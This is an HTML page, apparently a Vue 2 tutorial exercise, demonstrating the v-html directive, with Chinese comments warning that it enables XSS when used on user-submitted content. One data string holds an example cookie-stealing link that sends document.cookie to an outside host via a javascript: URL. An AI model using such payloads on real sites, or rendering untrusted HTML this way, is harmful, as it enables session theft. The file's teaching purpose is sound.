<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <!-- 
        v-html指令：
            1.作用：向指定节点中渲染包含html结构的内容
            2.与插值语法的区别：
                （1）v-html 会替换掉节点中所有的内容，{{xxx}}不会
                （2）v-html 可以识别html结构
            3.注意：v-html有安全性问题！！！
            （1）在网站动态渲染任意html是非常危险的，容易导致xss（冒充用户之手）攻击
            （2）一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！！
    -->
    <div id="root">
        <P>{{name}}</P>
        <P v-html="name"></P>
        <P v-html="str"></P>
        <!-- 如果服务器不完善，httponly未选上，则可能会泄露敏感数据 -->
        <P v-html="str2"></P>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.14"></script>
    <script>
        Vue.config.devtools = true
        Vue.filter('mySlice', function (value) {
            return value.slice(0, 4)
        })

        new Vue({
            el: "#root",
            data: {
                name: 'haha',
                str: '<h2>hahhah</h2>',
                str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>地址跳转</a>'
            },

        })
    </script>

</body>

</html>
